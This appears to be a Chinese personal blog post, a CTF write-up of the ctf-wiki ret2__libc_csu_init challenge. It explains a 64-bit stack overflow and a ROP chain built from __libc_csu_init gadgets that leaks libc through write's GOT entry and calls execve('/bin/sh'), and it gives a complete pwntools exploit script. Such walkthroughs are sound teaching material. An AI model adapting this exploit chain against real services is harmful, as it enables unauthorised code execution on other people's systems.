@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+
+
+  <html class="light page-post">
+
+
+<head>
+  <meta charset="utf-8">
+  
+  <title>libc_scu_init--中级ROP | V1NKe的心情垃圾桶</title>
+
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  
+    <meta name="keywords" content="PWN,Linux,Libc,scu,init," />
+  
+
+  <meta name="description" content="libc_scu_init">
+<meta name="keywords" content="PWN,BIN,Linux,libc,init,scu,ctf">
+<meta property="og:type" content="article">
+<meta property="og:title" content="libc_scu_init--中级ROP">
+<meta property="og:url" content="http://yoursite.com/2018/05/04/libc_scu_init--中级ROP/index.html">
+<meta property="og:site_name" content="V1NKe的心情垃圾桶">
+<meta property="og:description" content="libc_scu_init">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-04%20下午9.49.11.png">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-03%20下午9.48.15.png">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-03%20下午9.48.15.png">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-04%20下午9.56.03.png">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-05%20上午9.34.12.png">
+<meta property="og:image" content="http://yoursite.com/Users/v1nke/libc_init/屏幕快照%202018-05-05%20上午9.35.55.png">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-05%20上午9.38.21.png">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-04%20下午9.03.03.png">
+<meta property="og:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-04%20下午9.02.43.png">
+<meta property="og:updated_time" content="2018-05-05T02:43:35.382Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="libc_scu_init--中级ROP">
+<meta name="twitter:description" content="libc_scu_init">
+<meta name="twitter:image" content="http://yoursite.com/libc_init/屏幕快照%202018-05-04%20下午9.49.11.png">
+
+  
+
+  
+    <link rel="icon" href="/haimian.ico">
+  
+
+  <link href="/css/styles.css?v=c114cbe6" rel="stylesheet">
+
+
+  
+    <link rel="stylesheet" href="/css/personal-style.css">
+  
+
+  
+
+  
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?57e94d016e201fba3603a8a2b0263af0";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+  
+  <script type="text/javascript">
+	(function(){
+	    var bp = document.createElement('script');
+	    var curProtocol = window.location.protocol.split(':')[0];
+	    if (curProtocol === 'https') {
+	        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';        
+	    }
+	    else {
+	        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+	    }
+	    var s = document.getElementsByTagName("script")[0];
+	    s.parentNode.insertBefore(bp, s);
+	})();
+  </script>
+
+
+
+  
+    <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+  
+
+  
+    <link rel="stylesheet" href="//cdn.bootcss.com/font-awesome/4.3.0/css/font-awesome.min.css">
+  
+</head>
+
+<body>
+
+
+  
+    <span id="toolbox-mobile" class="toolbox-mobile">盒子</span>
+  
+
+  <div class="post-header CENTER">
+   
+  <div class="toolbox">
+    <a class="toolbox-entry" href="/">
+      <span class="toolbox-entry-text">盒子</span>
+      <i class="icon-angle-down"></i>
+      <i class="icon-home"></i>
+    </a>
+    <ul class="list-toolbox">
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/archives/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            博客
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/tag/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            标签
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/link/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            友链
+          </a>
+        </li>
+      
+        <li class="item-toolbox">
+          <a
+            class="CIRCLE"
+            href="/about/"
+            rel="noopener noreferrer"
+            target="_self"
+            >
+            关于
+          </a>
+        </li>
+      
+    </ul>
+  </div>
+
+
+</div>
+
+
+  <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#前言："><span class="toc-text">前言：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#附件："><span class="toc-text">附件：</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#详解："><span class="toc-text">详解：</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x1"><span class="toc-text">0x1:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x2"><span class="toc-text">0x2:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x3"><span class="toc-text">0x3:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x4"><span class="toc-text">0x4:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x5"><span class="toc-text">0x5:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用libc-init来泄漏write函数地址："><span class="toc-text">利用libc_init来泄漏write函数地址：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#重新执行main函数，execve写入bss段："><span class="toc-text">重新执行main函数，execve写入bss段：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#再次执行main函数，调用execve函数getshell："><span class="toc-text">再次执行main函数，调用execve函数getshell：</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x6"><span class="toc-text">0x6:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#EXP："><span class="toc-text">EXP：</span></a></li></ol></li></ol></li></ol>
+  </div>
+
+
+
+<div class="content content-post CENTER">
+   <article id="post-libc_scu_init--中级ROP" class="article article-type-post" itemprop="blogPost">
+  <header class="article-header">
+    <h1 class="post-title">libc_scu_init--中级ROP</h1>
+
+    <div class="article-meta">
+      <span>
+        <i class="icon-calendar"></i>
+        <span>2018.05.04</span>
+      </span>
+
+      
+        <span class="article-author">
+          <i class="icon-user"></i>
+          <span>V1NKe</span>
+        </span>
+      
+
+      
+
+
+      
+
+      
+      <i class="fa fa-eye"></i> 
+        <span id="busuanzi_container_page_pv">
+           &nbsp热度 <span id="busuanzi_value_page_pv">
+           <i class="fa fa-spinner fa-spin"></i></span>℃
+        </span>
+      
+      
+    </div>
+  </header>
+
+  <div class="article-content">
+    
+      <h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>这是一道ctf wiki上面的一道中级ROP，思路很明确，但是还是有些小坑，比如说write函数上面，还有pwntools函数上面等等…</p>
+<h1 id="附件："><a href="#附件：" class="headerlink" title="附件："></a>附件：</h1><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init" target="_blank" rel="noopener">https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/stackoverflow/ret2__libc_csu_init</a></p>
+<h1 id="详解："><a href="#详解：" class="headerlink" title="详解："></a>详解：</h1><h2 id="0x1"><a href="#0x1" class="headerlink" title="0x1:"></a>0x1:</h2><p>checksec后发现</p>
+<p><img src="/libc_init/屏幕快照 2018-05-04 下午9.49.11.png" alt="屏幕快照 2018-05-04 下午9.49.11"></p>
+<p>64位的程序，只开了NX保护。</p>
+<p>程序很简单，就一个read函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">void vulnerable_function()</span><br><span class="line">&#123;</span><br><span class="line">  char buf; // [rsp+0h] [rbp-80h]</span><br><span class="line"></span><br><span class="line">  read(0, &amp;buf, 0x200uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>栈溢出无疑。</p>
+<h2 id="0x2"><a href="#0x2" class="headerlink" title="0x2:"></a>0x2:</h2><p>先找偏移地址：</p>
+<p>输入地址：</p>
+<p><img src="/libc_init/屏幕快照 2018-05-03 下午9.48.15.png" alt="屏幕快照 2018-05-03 下午9.48.15"></p>
+<p>返回值地址：</p>
+<p><img src="/libc_init/屏幕快照 2018-05-03 下午9.48.15.png" alt="屏幕快照 2018-05-03 下午9.48.15"></p>
+<p>所以得到偏移为136</p>
+<h2 id="0x3"><a href="#0x3" class="headerlink" title="0x3:"></a>0x3:</h2><p>我们查找一下got函数表</p>
+<p><img src="/libc_init/屏幕快照 2018-05-04 下午9.56.03.png" alt="屏幕快照 2018-05-04 下午9.56.03"></p>
+<p>没有system函数，也找不到/bin/sh字符串，所以只能用libc泄漏函数地址来进行利用。我们这里选择用write函数来利用，打印出write_got函数的地址，再去寻找相对应的libc，当然也可以选用__libc_start_main来利用。</p>
+<h2 id="0x4"><a href="#0x4" class="headerlink" title="0x4:"></a>0x4:</h2><p>64位的特点：</p>
+<p>在64位程序中，函数的前6个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的gadgets。 这时候，我们可以利用x64下的__libc_scu_init中的gadgets。这个函数是用来对libc进行初始化操作的，而一般的程序都会调用libc函数，所以这个函数一定会存在。我们先来看一下这个函数：</p>
+<p>Libc_scu_init利用方法：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004005C0 ; void _libc_csu_init(void)</span><br><span class="line">.text:00000000004005C0                 public __libc_csu_init</span><br><span class="line">.text:00000000004005C0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o</span><br><span class="line">.text:00000000004005C0 ; __unwind &#123;</span><br><span class="line">.text:00000000004005C0                 push    r15</span><br><span class="line">.text:00000000004005C2                 push    r14</span><br><span class="line">.text:00000000004005C4                 mov     r15d, edi</span><br><span class="line">.text:00000000004005C7                 push    r13</span><br><span class="line">.text:00000000004005C9                 push    r12</span><br><span class="line">.text:00000000004005CB                 lea     r12, __frame_dummy_init_array_entry</span><br><span class="line">.text:00000000004005D2                 push    rbp</span><br><span class="line">.text:00000000004005D3                 lea     rbp, __do_global_dtors_aux_fini_array_entry</span><br><span class="line">.text:00000000004005DA                 push    rbx</span><br><span class="line">.text:00000000004005DB                 mov     r14, rsi</span><br><span class="line">.text:00000000004005DE                 mov     r13, rdx</span><br><span class="line">.text:00000000004005E1                 sub     rbp, r12</span><br><span class="line">.text:00000000004005E4                 sub     rsp, 8</span><br><span class="line">.text:00000000004005E8                 sar     rbp, 3</span><br><span class="line">.text:00000000004005EC                 call    _init_proc</span><br><span class="line">.text:00000000004005F1                 test    rbp, rbp</span><br><span class="line">.text:00000000004005F4                 jz      short loc_400616</span><br><span class="line">.text:00000000004005F6                 xor     ebx, ebx</span><br><span class="line">.text:00000000004005F8                 nop     dword ptr [rax+rax+00000000h]</span><br><span class="line">.text:0000000000400600</span><br><span class="line">.text:0000000000400600 loc_400600:                             ; CODE XREF: __libc_csu_init+54↓j</span><br><span class="line">.text:0000000000400600                 mov     rdx, r13</span><br><span class="line">.text:0000000000400603                 mov     rsi, r14</span><br><span class="line">.text:0000000000400606                 mov     edi, r15d</span><br><span class="line">.text:0000000000400609                 call    qword ptr [r12+rbx*8]</span><br><span class="line">.text:000000000040060D                 add     rbx, 1</span><br><span class="line">.text:0000000000400611                 cmp     rbx, rbp</span><br><span class="line">.text:0000000000400614                 jnz     short loc_400600</span><br><span class="line">.text:0000000000400616</span><br><span class="line">.text:0000000000400616 loc_400616:                             ; CODE XREF: __libc_csu_init+34↑j</span><br><span class="line">.text:0000000000400616                 add     rsp, 8</span><br><span class="line">.text:000000000040061A                 pop     rbx</span><br><span class="line">.text:000000000040061B                 pop     rbp</span><br><span class="line">.text:000000000040061C                 pop     r12</span><br><span class="line">.text:000000000040061E                 pop     r13</span><br><span class="line">.text:0000000000400620                 pop     r14</span><br><span class="line">.text:0000000000400622                 pop     r15</span><br><span class="line">.text:0000000000400624                 retn</span><br><span class="line">.text:0000000000400624 ; &#125; // starts at 4005C0</span><br><span class="line">.text:0000000000400624 __libc_csu_init endp</span><br></pre></td></tr></table></figure>
+<ol>
+<li>从0x000000000040061A一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx,rbp,r12,r13,r14,r15寄存器的数据。</li>
+<li>从0x0000000000400600到0x0000000000400609，我们可以将r13赋给rdx,将r14赋给rsi，将r15d赋给edi（需要注意的是，虽然这里赋给的是edi，<strong>但其实此时rdi的高32位寄存器值为0</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是x64函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li>
+<li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx+1=rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li>
+</ol>
+<h2 id="0x5"><a href="#0x5" class="headerlink" title="0x5:"></a>0x5:</h2><h4 id="利用libc-init来泄漏write函数地址："><a href="#利用libc-init来泄漏write函数地址：" class="headerlink" title="利用libc_init来泄漏write函数地址："></a>利用libc_init来泄漏write函数地址：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload = &apos;A&apos;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + &apos;a&apos;*(0x8+8*6) + p64(main_addr)</span><br></pre></td></tr></table></figure>
+<p>这里要注意的点是调用write函数去泄漏write_got地址的时候不要用write_plt表，而仍然要用write_got。</p>
+<p>用write_plt表调用情况：</p>
+<p><img src="/libc_init/屏幕快照 2018-05-05 上午9.34.12.png" alt="屏幕快照 2018-05-05 上午9.34.12"></p>
+<p>此时所调用的write_plt地址并不是我们想要的write函数地址<img src="/Users/v1nke/libc_init/屏幕快照 2018-05-05 上午9.35.55.png" alt="屏幕快照 2018-05-05 上午9.35.55"></p>
+<p>再看看write_got调用情况：</p>
+<p><img src="/libc_init/屏幕快照 2018-05-05 上午9.38.21.png" alt="屏幕快照 2018-05-05 上午9.38.21"></p>
+<p>正是我们所想要的write函数地址</p>
+<p>查看泄漏出的地址：</p>
+<p><img src="/libc_init/屏幕快照 2018-05-04 下午9.03.03.png" alt="屏幕快照 2018-05-04 下午9.03.03"></p>
+<p>为0x7fcf2fd482b0，查询对应的libc：</p>
+<p><img src="/libc_init/屏幕快照 2018-05-04 下午9.02.43.png" alt="屏幕快照 2018-05-04 下午9.02.43"></p>
+<h4 id="重新执行main函数，execve写入bss段："><a href="#重新执行main函数，execve写入bss段：" class="headerlink" title="重新执行main函数，execve写入bss段："></a>重新执行main函数，execve写入bss段：</h4><p>因为这里我没有泄漏出libc表中system函数地址，所以我们这里选用execve函数来拿shell。</p>
+<p>前面泄漏出execve地址就不详细说了。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload1 = &apos;A&apos;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_addr) + p64(0) + p64(mov_addr) + &apos;a&apos;*(0x8+8*6) + p64(main_addr)</span><br></pre></td></tr></table></figure>
+<p>这里选用read函数来写入bss段。再把字符串/bin/sh也写入进去。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.send(p64(execv_addr)+&apos;/bin/sh\x00&apos;)</span><br></pre></td></tr></table></figure>
+<p>这里面不能直接去使用execve函数的地址去调用它，而是应该把它的地址写入bss段再去使用该bss段地址，详细可以自己动手实验，具体原因我也不得而知。</p>
+<p>这里send和senline的区别就是senline自带\n结束。</p>
+<h4 id="再次执行main函数，调用execve函数getshell："><a href="#再次执行main函数，调用execve函数getshell：" class="headerlink" title="再次执行main函数，调用execve函数getshell："></a>再次执行main函数，调用execve函数getshell：</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">playload2 = &apos;A&apos;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr + 8) + p64(mov_addr)</span><br></pre></td></tr></table></figure>
+<p>这里就在所要call的函数地址写上bss段的地址，系统则会调用bss段上的的execve地址。</p>
+<h2 id="0x6"><a href="#0x6" class="headerlink" title="0x6:"></a>0x6:</h2><h3 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p = process(&apos;./level5&apos;)</span><br><span class="line">elf = ELF(&apos;level5&apos;)</span><br><span class="line">libc = ELF(&apos;libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">pop_addr = 0x40061a</span><br><span class="line">write_plt = elf.plt[&apos;write&apos;]</span><br><span class="line">write_got = elf.got[&apos;write&apos;]</span><br><span class="line">mov_addr = 0x400600</span><br><span class="line">main_addr = elf.symbols[&apos;main&apos;]</span><br><span class="line">read_got = elf.got[&apos;read&apos;]</span><br><span class="line">bss_addr = elf.bss()</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Hello, World\n&apos;)</span><br><span class="line">playload = &apos;A&apos;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(write_got) + p64(8) + p64(write_got) + p64(1) + p64(mov_addr) + &apos;a&apos;*(0x8+8*6) + p64(main_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(playload)</span><br><span class="line"></span><br><span class="line">write_start = u64(p.recv(8))</span><br><span class="line">print hex(write_start)</span><br><span class="line">libc_base = write_start - libc.symbols[&apos;write&apos;]</span><br><span class="line">execv_addr = libc_base + libc.symbols[&apos;execve&apos;]</span><br><span class="line"></span><br><span class="line">sleep(1)</span><br><span class="line">p.recvuntil(&apos;Hello, World\n&apos;)</span><br><span class="line">playload1 = &apos;A&apos;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(read_got) + p64(16) + p64(bss_addr) + p64(0) + p64(mov_addr) + &apos;a&apos;*(0x8+8*6) + p64(main_addr)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">p.sendline(playload1)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">sleep(1)</span><br><span class="line">p.send(p64(execv_addr)+&apos;/bin/sh\x00&apos;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;Hello, World\n&apos;)</span><br><span class="line">playload2 = &apos;A&apos;*136 + p64(pop_addr) + p64(0) + p64(1) + p64(bss_addr) + p64(0) + p64(0) + p64(bss_addr + 8) + p64(mov_addr)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.sendline(playload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+    
+  </div>
+
+  
+      <div class="git"></div>
+  
+
+</article>
+
+
+   
+  <div class="text-center donation">
+    <div class="inner-donation">
+      <span class="btn-donation">支持一下</span>
+      <div class="donation-body">
+        <div class="tip text-center">扫一扫，支持v1nke</div>
+        <ul>
+        
+          <li class="item">
+            <span>微信扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+          <li class="item">
+            <span>支付宝扫一扫</span>
+            <img src="/images/qr-wechat.jpeg" alt="">
+          </li>
+        
+        </ul>
+      </div>
+    </div>
+  </div>
+
+
+   
+  <div class="box-prev-next clearfix">
+    <a class="show pull-left" href="/2018/05/01/一道CTF所了解的沙盒逃逸/">
+        <i class="icon icon-angle-left"></i>
+    </a>
+    <a class="hide pull-right" href="/">
+        <i class="icon icon-angle-right"></i>
+    </a>
+  </div>
+
+
+
+
+</div>
+
+
+  <a id="backTop" class="back-top">
+    <i class="icon-angle-up"></i>
+  </a>
+
+
+
+
+  <div class="modal" id="modal">
+  <span id="cover" class="cover hide"></span>
+  <div id="modal-dialog" class="modal-dialog hide-dialog">
+    <div class="modal-header">
+      <span id="close" class="btn-close">关闭</span>
+    </div>
+    <hr>
+    <div class="modal-body">
+      <ul class="list-toolbox">
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/archives/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              博客
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/tag/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              标签
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/link/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              友链
+            </a>
+          </li>
+        
+          <li class="item-toolbox">
+            <a
+              class="CIRCLE"
+              href="/about/"
+              rel="noopener noreferrer"
+              target="_self"
+              >
+              关于
+            </a>
+          </li>
+        
+      </ul>
+
+    </div>
+  </div>
+</div>
+
+
+
+  
+      <div class="fexo-comments comments-post">
+    
+
+    
+    
+
+    
+    
+
+    
+
+    
+    
+
+  </div>
+
+  
+
+  <script type="text/javascript">
+  function loadScript(url, callback) {
+    var script = document.createElement('script')
+    script.type = 'text/javascript';
+
+    if (script.readyState) { //IE
+      script.onreadystatechange = function() {
+        if (script.readyState == 'loaded' ||
+          script.readyState == 'complete') {
+          script.onreadystatechange = null;
+          callback();
+        }
+      };
+    } else { //Others
+      script.onload = function() {
+        callback();
+      };
+    }
+
+    script.src = url;
+    document.getElementsByTagName('head')[0].appendChild(script);
+  }
+
+  window.onload = function() {
+    loadScript('/js/bundle.js?235683', function() {
+      // load success
+    });
+  }
+</script>
+
+</body>
+</html>
